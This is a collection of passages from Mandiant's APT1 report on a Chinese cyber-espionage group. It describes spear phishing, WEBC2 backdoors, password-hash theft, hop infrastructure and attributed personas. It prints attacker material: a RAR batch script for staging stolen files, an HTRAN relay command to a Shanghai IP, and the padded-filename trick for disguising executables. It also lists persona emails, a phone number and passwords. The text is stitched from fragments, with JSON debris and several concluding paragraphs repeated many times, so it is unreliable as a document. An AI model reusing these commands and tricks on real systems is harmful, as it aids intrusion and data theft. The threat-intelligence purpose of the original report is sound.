However, several factors complicate the process of compiling and synthesizing public reports on APT1. For one thing, information security researchers and journalists refer to APT1 by a variety of names. In addition, many cyber security analysts focus on writing about tools that are shared between multiple Chinese APT groups without differentiating between the various actors that use them. To assist researchers in identifying which public reports describe the threat group that we identify as APT1, Table 3 provides a list of APT group nicknames that frequently appear in the media and differentiates between those that describe APT1 and those that do not. In addition, below is a list of public reports about Chinese threat actors that we have confirmed as referring to APT1. - The earliest known public report about APT1 infrastructure is a 2006 publication from the Japanese division of Symantec.³⁰ The report calls out the hostname sb.hugesoft.org, which is registered to an APT1 persona known as Ugly Gorilla (discussed later in this report). - In September 2012, Brian Krebs of the “Krebs on Security” cybercrime blog reported on a security breach at Telvent Canada Ltd (now Schneider Electric), which we attributed to APT1 based on the tools and infrastructure that the hackers used to exploit and gain access to the system.³¹ - A SCADA security company by the name of Digital Bond published a report of spear phishing against its company in June 2012.³² AlienVault provided analysis on the associated malware.³³ Indicators included in the report have been attributed as part of APT1 infrastructure. - In November 2012, Bloomberg’s Chloe Whiteaker authored a piece on a Chinese threat group called “Comment Group,” which described the various tools and domains used by APT1 persona Ugly Gorilla.³⁴ Mandiant APT1 www.mandiant.com"

They employ good English — with acceptable slang — in their socially engineered emails. They have evolved their digital weapons for more than seven years, resulting in continual upgrades as part of their own software release cycle. Their ability to adapt to their environment and spread across systems makes them effective in enterprise environments with trust relationships.

As with most other APT groups, spear phishing is APT1's most commonly used technique. The spear phishing emails contain either a malicious attachment or a hyperlink to a malicious file. The subject line and the text in the email body are usually relevant to the recipient. APT1 also creates webmail accounts using real peoples' names — names that are familiar to the recipient, such as a colleague, a company executive, an IT department employee, or company counsel — and uses these accounts to send the emails. As a real-world example, this is an email that APT1 sent to Mandiant employees: ```txt Date: Wed, 18 Apr 2012 06:31:41 -0700 From: Kevin Mandia <kevin.mandia@rocketmail.com> Subject: Internal Discussion on the Press Release Hello, Shall we schedule a time to meet next week? We need to finalize the press release. Details click here. Kevin Mandia ``` At first glance, the email appeared to be from Mandiant's CEO, Kevin Mandia. However, further scrutiny shows that the email was not sent from a Mandiant email account, but from \"kevin.mandia@rocketmail.com\". Rocketmail is a free webmail service. The account \"kevin.mandia@rocketmail.com\" does not belong to Mr. Mandia. Rather, an APT1 actor likely signed up for the account specifically for this spear phishing event. If anyone had clicked on the link that day (which no one did, thankfully), their computer would have downloaded a malicious ZIP file named \"Internal_Discussion_Press_Release_In_Next_Week8.zip\". This file contained a malicious executable that installs a custom APT1 backdoor that we call WEBC2-TABLE. Mandiant APT1 www.mandiant.com</kevin.mandia@rocketmail.com> Although the files that APT1 actors attach or link to spear phishing emails are not always in ZIP format, this is the predominant trend we have observed in the last several years.

Some names are also generic (e.g., \"updated_office_contact_v1.zip\") and could be used for targets in any industry.

Some APT1 actors have gone to the trouble of making the malicious software inside their ZIP files look like benign Adobe PDF files. Here is an example: Name Type employee benefit and overhead adjustment keys.pdf ... Application This is not a PDF file. It looks like the filename has a PDF extension but the file name actually includes 119 spaces after \".pdf\" followed by \".exe\" — the real file extension. APT1 even went to the trouble of turning the executable's icon to an Adobe symbol to complete the ruse. However, this file is actually a dropper for a custom APT1 backdoor that we call WEBC2-QBP. Establishing A Foothold Establishing a foothold involves actions that ensure control of the target network's systems from outside the network. APT1 establishes a foothold once email recipients open a malicious file and a backdoor is subsequently installed. A backdoor is software that allows an intruder to send commands to the system remotely. In almost every case, APT backdoors initiate outbound connections to the intruder's \"command and control\" (C2) server. APT intruders employ this tactic because while network firewalls are generally adept at keeping malware outside the network from initiating communication with systems inside the network, they are less reliable at keeping malware that is already inside the network from communicating to systems outside. While APT1 intruders occasionally use publicly available backdoors such as Poison Ivy and Gh0st RAT, the vast majority of the time they use what appear to be their own custom backdoors. We have documented 42 families of backdoors in \"Appendix C: The Malware Arsenal\" that APT1 uses that we believe are not publicly available. In addition we have provided 1,007 MD5 hashes associated with APT1 malware in Appendix E. We will describe APT1's backdoors in two categories: \"Beachhead Backdoors\" and \"Standard Backdoors.\" Mandiant APT1 www.mandiant.com Mandiant APT1 31 www.mandiant.com"

They offer the attacker a toe-hold to perform simple tasks like retrieve files, gather basic system information and trigger the execution of other more significant capabilities such as a standard backdoor. APT1's beachhead backdoors are usually what we call WEBC2 backdoors. WEBC2 backdoors are probably the most well-known kind of APT1 backdoor, and are the reason why some security companies refer to APT1 as the \"Comment Crew.\" A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can confirm that APT1 was using WEBC2 backdoors as early as July 2006. However, the first compile time³⁵ we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years. For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:"

However, one can expect that an iPad 1 and an iPad 2 share a significant number of components — much more than, say, an iPad 1 and a Microsoft Surface.

When it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family.

The compile date is easily accessible in the PE header of the resulting executable file unless the intruder takes additional steps to obfuscate it. A \"build path\" discloses the directory from which the programmer built and compiled his source code. These samples, compiled 2.5 years apart, were compiled within a folder named \"work\\code\\...\\ mywork\". The instances of \"work\" suggest that working on WEBC2 is someone's day job and not a side project or hobby. Furthermore, the Sample A build string includes \"2012-2-23\" — which matches Sample A's compile date. The Sample B build string lacks \"2012-2-23\" but includes \"2009-8-7\" — which also matches Sample B's compile date. This suggests that the code used to compile Sample A was modified from code that was used to compile Sample B 2.5 years previously. The existence of \"2008-7-8\" suggests that the code for both samples was modified from a version that existed in July 2008, a year before Sample B was created. This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long-term process. WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems, including: - Open an interactive command shell (usually Windows' cmd.exe) - Download and execute a file - Sleep (i.e. remain inactive) for a specified amount of time WEBC2 backdoors are often packaged with spear phishing emails.

Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person's password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person's password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in. It is supposed to be impossible to \"reverse\" a hash to obtain the original password. However, it is possible with enough computational resources to \"crack\" password hashes to discover the original password. (\"Cracking\" generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by \"passing-the-hash\") or crack them to discover users' passwords."

Mandiant APT1 www.mandiant.com 3. Log in to web portals Once armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This includes not only restricted websites, but also web-based email systems such as Outlook Web Access. Completing The Mission Similar to other APT groups we track, once APT1 finds files of interest they pack them into archive files before stealing them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 19. (The instances of \"XXXXXX\" obfuscate the text that was in the actual batch script.) ```shell @echo off cd /d c:\\windows\\tasks rar.log a XXXXXXXX.rar -v200m \"C:\\Documents and Settings\\Place\\My Documents\\XXXXXX\" -hpsmy123!@# del *.vbs del %0 ``` After creating files compressed via RAR, the APT1 attackers will transfer files out of the network in ways that are consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many times their RAR files are so large that the attacker splits them into chunks before transferring them. Figure 19 above shows a RAR command with the option \"-v200m\", which means that the RAR file should be split up into 200MB portions. Mandiant APT1 www.mandiant.com Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The first, GETMAIL, was designed specifically to extract email messages, attachments, and folders from within Microsoft Outlook archive (\"PST\") files. Microsoft Outlook archives can be large, often storing years' worth of emails. They may be too large to transfer out of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows APT1 intruders the flexibility to take only the emails between dates of their choice. In one case, we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week's emails. Whereas GETMAIL steals email in Outlook archive files, the second utility, MAPIGET, was designed specifically to steal email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email from specified accounts into text files (for the email body) and separate attachments, if there are any."

To put it simply, it is easy for APT1 attackers to bounce or \"hop\" through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country they choose. The systems in this type of network redirection infrastructure have come to be called \"hop points\" or \"hops.\" Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as camouflage for their attacks without the knowledge of the systems' owners. These systems belong to third-party victims who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data and intellectual property. Mandiant APT1 www.mandiant.com We have observed some of APT1's activities after they cross into (virtual) U.S. territory. They access hop points using a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to January 2013) we confirmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to a system. The experience is similar to the user actually physically sitting at the system and having direct access to the desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1's home networks. Notably, the registration information for the second and third net blocks above includes this contact information at the end: person: yanling ruan nic-hdl: YR194-AP e-mail: sh-ipmaster@chinaunicom.cn address: No.900, Pudong Avenue, ShangHai, China phone: +086-021-61201616 fax-no: +086-021-61201616 country: cn The registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where PLA Unit 61398 is headquartered. The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea (1). We have confirmed that some of these systems are part of APT1's hop infrastructure and not legitimately owned by APT1 — in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from Shanghai. In order to make a user's experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was \"Chinese (Simplified) — US Keyboard.\" Microsoft's Remote Desktop client configures this setting automatically based on the selected language on the client system, making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simplified Chinese (zh-cn) input settings. \"Simplified Chinese\" is a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland China"

Mandiant APT1 www.mandiant.com Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443: ```txt htran -tran 443 58.247.242.254 443 ``` In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses.

For example, \"hugesoft.org\" is an FQDN but also represents a zone. The FQDNs \"ug-co.hugesoft.org\" and \"7cback.hugesoft.org\" are part of the \"hugesoft.org\" zone and are called \"subdomains\" of the zone. The person who registered \"hugesoft.org\" may add as many subdomains as they wish and controls the IP resolutions of these FQDNs. APT1 has registered at least 107 zones since 2004. Within these zones, we know of thousands of FQDNs that have resolved to hundreds of IP addresses (which we suspect are hops) and in some instances to APT1's source IP addresses in Shanghai. The first zone we became aware of was \"hugesoft.org\", which was registered through eNom, Inc. in October 2004. The registrant supplied \"uglygorilla@163.com\" as an email address. The supplied registration information, which is still visible in public \"whois\" data as of February 3, 2013, includes the following: Mandiant APT1 www.mandiant.com Domain Name:HUGESOFT.ORG Created On:25-Oct-2004 09:46:18 UTC Registrant Name:huge soft Registrant Organization:hugesoft Registrant Street1:shanghai Registrant City:shanghai Registrant State/Province:S Registrant Postal Code:200001 Registrant Country:CN Registrant Phone:+86.21000021 Registrant Email:uglygorilla@163.com The supplied registrant information does not need to be accurate for the zone to be registered successfully. For example, \"shanghai\" is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the first known APT1 domain registration, along with a phone number that begins with China's \"+86\" international code. In fact, Shanghai was listed as the registrant's city in at least 24 of the 107 (22%) registrations. Compare this to the frequency with which other cities appeared in APT1 zone registration information: Mandiant APT1 www.mandiant.com Some of the supplied registration information is obviously false. For example, consider the registration information supplied for the zone \"uszzcs.com\" in 2005: Victor etejedaa@yahoo.com +86.8005439436 Michael Murphy 795 Livermore St. Yellow Spring, Ohio, UNITED STATES 45387 Here, a phone number with a Chinese prefix (\"+86\") accompanied an address in the United States. Since the United States uses the prefix \"+\" it is highly unlikely that a person living in Ohio would provide a phone number beginning with \"+86\". Additionally, the city name is spelled incorrectly, as it should be \"Yellow Springs\" instead of \"Yellow Spring\". This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name incorrectly multiple times, both for the zones \"uszzcs.com\" and \"attnpower.com\". This suggests that the registrant really thought \"Yellow Spring\" was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, Ohio. Overall, the combination of a relatively high number of \"Shanghai\" registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present, in which some registrants tried to fabricate non-Shanghai locations but others did not"

These themes cause APT1 command and control addresses to appear benign at first glance.

The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters. However, they also include names referencing English-speaking countries, such as \"aunewsonline.com\" (Australia), \"canadatvsite.com\" (Canada), and \"todayusa.org\" (U.S.). Below is a list of zones registered by APT1 that are news-themed: The technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing topics like software: Finally, some zones used by APT1 reflect a business theme. The names suggest websites that professionals might visit: Not every zone stays within APT1's control forever. Over a campaign lasting for so many years, APT1 has not always renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, others have been transferred to the organizations that the domain names attempted to imitate. For example, in September 2011, Yahoo filed a complaint against \"zheng youjun\" of \"Arizona, USA\", who registered the APT1 zone \"myyahoonews.com\".37 Yahoo alleged the \"<myyahoonews.com> domain name was confusingly similar to Complainant's YAHOO! mark\" and that \"[zheng youjun] registered and used the <myyahoonews.com> domain name in bad faith.\" In response, the National Arbitration Forum found that the site \"myyahoonews.com\" at the time resolved Mandiant APT1 www.mandiant.com</myyahoonews.com></myyahoonews.com> to \"a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials under false pretenses.\" Not surprisingly, \"zheng youjun\" did not respond.

In our effort to underscore that there are actual individuals tasked by the PLA behind APT1's keyboards, we have decided to expose the identities of a select number of APT1 personas. These actors have made poor operational security choices, facilitating our research and allowing us to track their activities. They are some of the authors of APT1's digital weapons and the registrants of APT1 FQDNs and email accounts. These actors have expressed interest in China's cyber warfare efforts, disclosed their locations to be the Pudong New Area of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns. Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture. Often this unified viewpoint reveals not only the group attribution, but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as \"personas.\" As APT1 personas manage technical resources such as hops and Fully Qualified Domain Names (FQDNs), they have been observed to de-conflict their actions amongst themselves by coordinating the use of specific hops, FQDNs, CNO tools (e.g., malware) and ports. One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google.com, facebook.com, and twitter.com. Additionally, the nature of the hackers' work requires them to have control of network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure.

The \"Great Firewall\" uses methods such as blocking particular IP addresses; blocking or redirecting specific domain names; filtering or blocking any URL containing target keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese websites, blogs, and social media for \"inappropriate\" content, removing it when found. As a result, Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption. China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks.

As Director of the “Military Technology and Equipment” (军事科技与装备) department at China's National Defense University (国防大学), professor Zhang was invited to take part in an event titled “Outlook 2004: The International Strategic Situation” in January 2004. During the online question and answer session hosted by the PLA Daily's (解放军报) China Military Online (中国军网), one young man with the nickname “Greenfield” (绿野) posed a particularly prescient question. “Professor Zhang, I read your book 'Network Warfare' and was deeply impressed by the views and arguments in the book. It is said that the U.S. military has set up a dedicated network force referred to as a 'cyber army.' Does China have a similar force? Does China have cyber troops?” — UglyGorilla 16 Jan 2004 Like all users of the China Military Online (chinamil) forums, “Greenfield” was required to sign up with an email address and specify a small bit of information about himself.

UG's consistent use of the username \"UglyGorilla\" across various Web accounts has left a thin but strong thread of attribution through many online communities.

DOTA may have taken his name from the video game “Defense of the Ancients” which is commonly abbreviated DotA, though we have yet to observe any direct link or other direct reference to the game. We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com, and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web-based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services. For example, DOTA (originating from the APT1 home range IP address 58.247.26.59) with a Simplified Chinese keyboard setting used the email address “d0ta001@hotmail.com” from his US hop to register the Facebook user “do.ta.5011”(Facebook user id: 100002184628208). Some services, such as Google’s Gmail, require users to provide a phone number during the registration process to which they send a validation “text message” containing a verification code. The user must then input the verification code on the website to finalize registration. In an observed session on a compromised machine, DOTA used the phone number “159-2193-7229” to receive a verification text message from Google, which he then submitted to their page within seconds. Telephone numbers in China are organized into a hierarchy containing an area code, prefix, and line number similar to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone providers. The phone number “159-2193-7229” breaks down into the “159” area code, which indicates a mobile phone provided by China Mobile, and the prefix “2193”, which indicates a Shanghai mobile number. This means at the very least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA’s response also indicates that he had the phone with him at the time. We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English with various targets including South East Asian military organizations in Malaysia and the Philippines. It is unclear if this Gmail account is used exclusively for facilitating his CNO mission, but much of the traffic indicates its use in both simple phishing attacks, as well as more sophisticated email based social engineering."

Mandiant APT1 www.mandiant.com When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management becomes a significant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based, such as the keyboard pattern \"1qaz2wsx\" or highly memorable, using \"rootkit\" as a password on the information security research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as passwords such as \"1qaz@WSX#EDC\". However, there is one password \"2j3c1k\" extensively used by DOTA that is not based on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered \"j\", followed by a numbered \"c\", and then a numbered \"k\" is likely shorthand (\"j\"/\"c\"/\"k\") for the ju/chu/ke (局/处/科) organizational structure (translated to Bureau/Division (or Office)/Section) widely used within PLA General Staff Department organizations. Project 2049 describes the typical PLA organizational structure as, \"Bureau-level directors ... oversee between six and 14 subordinate sites or offices [chu;处]... Sites/offices under bureaus are further divided into sections Mandiant APT1 www.mandiant.com [ke; 科].42 Given this pattern, it is likely that the password \"2j3c1k\" stands for 2nd Bureau [Unit 61398], 3rd Division, 1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd Bureau. Attempting to track the DOTA persona back to a particular individual is difficult; the trail of his activity does not link as clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA. Specifically, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together."

SH was first observed as a tool author, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the tools. In particular, elements of the portable executable (PE) file's VS_VERSIONINFO structure are frequently set to \"SuperHard,\" or cmd.exe copies are modified from \"Microsoft corp.\" to \"superhard corp.\" Additionally, many of SH's tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH's tools are observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH's tools are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is primarily involved in research and development for APT1. Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.com account \"SuperHard_M\" was originally registered from the IP address 58.247.237.4, within one of the known APT1 egress ranges, and using the email address \"mei_qiang_82@sohu.com\". We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name \"Mei Qiang\" (梅强) is a reasonably common Chinese last/first name combination.

Unfortunately, there are several \"Mei Qiang\" identities online that claim a birth year of 1982, making attribution to an individual difficult. Fortunately, we can use SH's email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH's link to the \"mei_qiang_82@sohu.com\"43 email address and APT1 affiliation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by \"greenfield\", possibly UG), and more recently, being local to Shanghai's Pudong New Area.44 Mandiant APT1 www.mandiant.com"

Mandiant uses the term *threat group* to refer to a collection of intruders who are working together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is ultimately defined by people and not by methodology. However, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the same person, by two people who are working together, by two unrelated people who independently compromised the same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise the same target. Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details: - The method the thief used to break in; - The tools used to open the safe; - Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to grab something of value; - Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as fingerprints; or whether he was not very careful, but simply relied on being \"stealthy enough\" to not get caught. Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another. In a similar way, cyber intruders leave behind various digital \"fingerprints.\" They may send spear-phishing emails from a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another. Digital \"fingerprints\" do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as HTRAN is not unique and not useful — by itself — as an indicator of a specific threat group"

The sections below correspond to the stages of Mandiant's Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages between \"Establish Foothold\" and \"Complete Mission\" do not have to occur in this order every time. In fact, once established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying data of interest, moving laterally to access that data, and \"completing mission\" by stealing the data. This will generally continue indefinitely until they are removed entirely from the network."

APT intruders frequently target individual users within a victim environment. As such, the most commonly observed method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to a malicious file, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer is vulnerable to the attacker's exploit code. APT groups may also look for vulnerable Internet-facing web servers and upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in public-facing infrastructure."

APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are common examples), \"underground\" backdoors found in hacker websites or obtained through personal connections, and \"custom\" backdoors that they developed themselves. These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give the APT groups basic access to a system, typically through a command shell or graphical user interface. Mandiant APT1 www.mandiant.com"

Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI certificates, VPN client software, privileged computers, or other resources required to access data or systems of interest. APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user accounts. This is typically accomplished by first \"dumping\" password hashes from a computer, server, or (preferably) Domain Controller. The attacker may be able to obtain legitimate account passwords by \"cracking\" password hashes. Alternately, the attacker may leverage the hashes themselves in a \"pass-the-hash\" attack, where the hashed password itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily leveraged for both password dumping and pass-the-hash attacks."

The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398."

From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others."

The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have confirmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a specific hop point (IP address) they can \"point\" the C2 FQDN address to a different IP address and resume their control over victim backdoors. This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked."

We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1.

In the last several years we have confirmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a specific hop point (IP address) they can \"point\" the C2 FQDN address to a different IP address and resume their control over victim backdoors. This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked.",

In seeking to identify the organization behind this activity, our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate."

The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398."

Though our visibility of APT1’s activities is incomplete, we have analyzed the group’s intrusions against nearly 150 victims over seven years. From our unique vantage point responding to victims, we tracked APT1 back to four large networks in Shanghai, two of which are allocated directly to the Pudong New Area. We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1. These operators, like soldiers, may merely be following orders given to them by others."

The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have confirmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard-coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a specific hop point (IP address) they can \"point\" the C2 FQDN address to a different IP address and resume their control over victim backdoors. This flexibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked."

We refer to this group as “APT1” and it is one of more than 20 APT groups with origins in China. APT1 is a single organization of operators that has conducted a cyber espionage campaign against a broad range of victims since at least 2006. From our observations, it is one of the most prolific cyber espionage groups in terms of the sheer quantity of information stolen. The scale and impact of APT1’s operations compelled us to write this report."

In seeking to identify the organization behind this activity, our research found that People’s Liberation Army (PLA’s) Unit 61398 is similar to APT1 in its mission, capabilities, and resources. PLA Unit 61398 is also located in precisely the same area from which APT1 activity appears to originate."

The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398."

We uncovered a substantial amount of APT1’s attack infrastructure, command and control, and modus operandi (tools, tactics, and procedures). In an effort to underscore there are actual individuals behind the keyboard, Mandiant is revealing three personas we have attributed to APT1.

